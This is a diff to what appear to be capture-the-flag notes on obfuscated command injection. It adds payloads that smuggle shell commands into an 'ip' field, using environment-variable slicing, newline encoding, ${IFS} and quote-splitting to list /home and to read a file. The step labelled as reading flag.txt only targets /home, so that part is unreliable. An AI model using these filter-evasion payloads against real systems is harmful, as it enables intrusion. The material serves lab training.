@@ -32,14 +32,27 @@ ${LS_COLORS:10:1} → turns into ; <br>
 
 <img width="1208" height="176" alt="image" src="https://github.com/user-attachments/assets/58ee94cd-1215-4d62-ae14-10b3d66f3399" />
 
-Obfuscating command injection
 
-Find the user name in /home
+### Find the user name in /home
 ```
 ip=127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
 
 ```
 <img width="1450" height="537" alt="image" src="https://github.com/user-attachments/assets/84ce19b6-48ab-4562-8a9b-46790c90522f" />
+
+### Read the flag.txt file under /home
+
+```
+127.0.0.1${LS_COLORS:10:1}%0ac"at"${IFS}${PATH:0:1}home
+
+c"at" -> cat
+
+Deobfuscate
+
+127.0.0.1 ; 
+cat /home
+
+```
 
 
 
